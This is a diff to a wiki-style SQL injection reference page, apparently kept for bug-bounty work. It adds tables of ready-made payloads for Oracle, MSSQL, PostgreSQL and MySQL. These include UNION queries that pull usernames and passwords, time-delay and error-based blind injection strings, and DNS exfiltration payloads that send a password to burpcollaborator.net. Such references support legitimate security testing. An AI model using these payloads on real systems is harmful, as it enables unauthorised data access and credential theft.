@@ -10,7 +10,8 @@ tags:
   - bug-bounty
   - payload
 sources:
-  - unprocessed-obsidians/sql-injection.md
+  - sources/sql-injection.md
+  - sources/sql-injection-notes.md
 confidence: high
 contested: false
 contradictions: []
@@ -245,6 +246,57 @@ information_schema.tables
 information_schema.columns
 ```
 
+
+### Advanced Multi-Database Syntax & Exfiltration Matrix
+
+#### String Concatenation Matrix
+
+| Database Engine | Concatenation Syntax | Example Payload |
+| :--- | :--- | :--- |
+| **Oracle** | `'foo' || 'bar'` | `' UNION SELECT username || '~' || password FROM users--` |
+| **Microsoft SQL Server** | `'foo' + 'bar'` | `' UNION SELECT username + '~' + password FROM users--` |
+| **PostgreSQL** | `'foo' || 'bar'` | `' UNION SELECT username || '~' || password FROM users--` |
+| **MySQL** | `'foo' 'bar'` or `CONCAT('foo','bar')` | `' UNION SELECT CONCAT(username,'~',password) FROM users#` |
+
+#### Substring Extraction Matrix
+
+| Database Engine | Substring Function Syntax |
+| :--- | :--- |
+| **Oracle** | `SUBSTR('string', start, length)` (e.g. `SUBSTR(password, 1, 1)='a'`) |
+| **Microsoft SQL Server** | `SUBSTRING('string', start, length)` |
+| **PostgreSQL** | `SUBSTRING('string', start, length)` or `SUBSTR('string', start, length)` |
+| **MySQL** | `SUBSTRING('string', start, length)` or `MID('string', start, length)` |
+
+#### Out-of-Band (OAST) DNS Exfiltration Matrix
+
+When web applications restrict inbound/outbound responses, attackers trigger asynchronous DNS lookups to capture extracted data strings:
+
+| Database Engine | Out-of-Band Exfiltration Payload |
+| :--- | :--- |
+| **Oracle** | `SELECT UTL_INADDR.get_host_address(password || '.burpcollaborator.net') FROM users WHERE ROWNUM=1;` |
+| **Microsoft SQL Server** | `EXEC master..xp_dirtree '\\' + (SELECT password FROM users WHERE id=1) + '.burpcollaborator.net\a';` |
+| **PostgreSQL** | `COPY (SELECT '') TO PROGRAM 'nslookup ' || (SELECT password FROM users LIMIT 1) || '.burpcollaborator.net';` |
+| **MySQL** | `SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.burpcollaborator.net\\a'));` |
+
+#### Conditional Error Oracles
+
+- **Oracle**: `SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual;`
+- **Microsoft SQL Server**: `SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END;`
+- **PostgreSQL**: `SELECT CASE WHEN (1=1) THEN CAST(1/0 AS text) ELSE '' END;`
+- **MySQL**: `SELECT IF(1=1, (SELECT table_name FROM information_schema.tables),'');`
+
+#### Time-Delay Command Matrix
+
+| Database Engine | Time Delay Syntax | Example Injection Payload |
+| :--- | :--- | :--- |
+| **Oracle** | `dbms_pipe.receive_message(('a'), 10)` | `'+AND+1234=dbms_pipe.receive_message(('a'),10)--` |
+| **Microsoft SQL Server** | `WAITFOR DELAY '0:0:10'` | `';+WAITFOR+DELAY+'0:0:10'--` |
+| **PostgreSQL** | `pg_sleep(10)` | `'+AND+1234=(SELECT+1234+FROM+pg_sleep(10))--` |
+| **MySQL** | `sleep(10)` | `'+AND+sleep(10)#` |
+
+
+## Primary Sources & Provenance
+- Provenance source anchors: [[sql-injection]], [[sql-injection-notes]]
 
 ## Related Pages
 - [[sql-injection-testing]]
